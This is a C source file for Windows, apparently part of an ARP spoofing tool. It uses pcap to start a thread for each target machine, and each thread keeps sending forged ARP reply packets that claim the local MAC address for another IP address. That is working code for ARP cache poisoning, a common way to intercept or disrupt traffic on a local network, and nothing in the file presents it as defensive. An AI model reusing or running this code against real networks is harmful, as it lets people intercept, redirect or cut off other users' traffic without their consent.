#include "pcap.h"
#include "windows.h"
#include "spoof.h"
#include "packet.h"
#include "globals.h"

#define MAX_THREADS MAX_MACHINES * 2

static unsigned int threadsTop = 0;
static HANDLE hThreads[MAX_THREADS];

unsigned int spoofedTop = 0;
MachineInfo spoofedMachines[MAX_MACHINES];

static ULONG SpoofThreadProc(LPVOID lpParams)
{
    MachineInfo *params = lpParams;
    char errbuf[PCAP_BUF_SIZE];
    pcap_t *subDevice = pcap_open(DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
    ArpPacket *arpPacket = malloc(sizeof(ArpPacket));
    while (!exitFlag)
    {
        SetupArpPacket(arpPacket, localMacAddr, params->MacAddress, ipAddr, params->IpAddress, 2);
        pcap_sendpacket(subDevice, (const uint8_t *)arpPacket, sizeof(ArpPacket));
    }
    free(arpPacket);
    pcap_close(subDevice);
    free(params);
}

void CreateSpoofThread(uint8_t *targetMac, uint32_t targetIp)
{
    if (spoofedTop >= MAX_MACHINES)
    {
        return;
    }

    DWORD threadId;
    HANDLE handle;
    MachineInfo *pParams = malloc(sizeof(MachineInfo));
    memcpy(pParams->MacAddress, targetMac, 6);
    pParams->IpAddress = targetIp;
    if (handle = CreateThread(NULL, 0, SpoofThreadProc, pParams, 0, &threadId))
    {
        LOG("Spoof thread on MAC %.2x%.2x%.2x%.2x%.2x%.2x started",
            targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5]);
        hThreads[threadsTop++] = handle;
        memcpy(&spoofedMachines[spoofedTop], pParams, sizeof(MachineInfo));
        spoofedTop++;
    }
}